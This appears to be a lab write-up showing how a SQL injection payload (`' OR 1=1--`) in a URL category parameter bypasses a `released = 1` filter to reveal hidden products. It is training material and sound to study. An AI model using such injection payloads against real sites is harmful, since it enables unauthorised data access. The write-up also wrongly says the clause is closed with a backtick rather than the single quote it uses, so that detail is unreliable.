## SQL Injection - Lab 1: SQL Injection Vulnerability in WHERE Clause Allowing Retrieval of Hidden Data

### Description
This lab contains a SQL injection vulnerability in the product category filter. When the user selects a category, the application carries out a SQL query like the following:

```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

To solve the lab, perform a SQL injection attack that causes the application to display one or more unreleased products.

When we look at the site, we can see we have the option to filter the products by category. This will make the URL look like:

```
https://web-security-academy.net/filter?category=Accessories
```

If we are filtering by accessories. Taking what we know from the lab prompt, this makes the SQL query:

```sql
SELECT * FROM products WHERE category = 'Accessories' AND released = 1
```

If we wanted to display unreleased products, we will need to escape the confines of the prompt to ignore the `AND released = 1` clause.

Ideally, we want our SQL query to look like:

```sql
SELECT * FROM products WHERE category = 'Accessories' OR 1=1-- AND released = 1
```

We want the `OR 1=1` clause so that all products are returned, even if they are unreleased.

To do this, we will need to change our URL to be:

```
https://web-security-academy.net/filter?category=Accessories'+OR+1=1--
```

What we are doing here is closing off the category clause with `` ` `` and then adding the `+OR+1=1`. We must include the spaces because this SQL inject is done through the URL, so in order for it to process correctly, we need to have the spaces be used.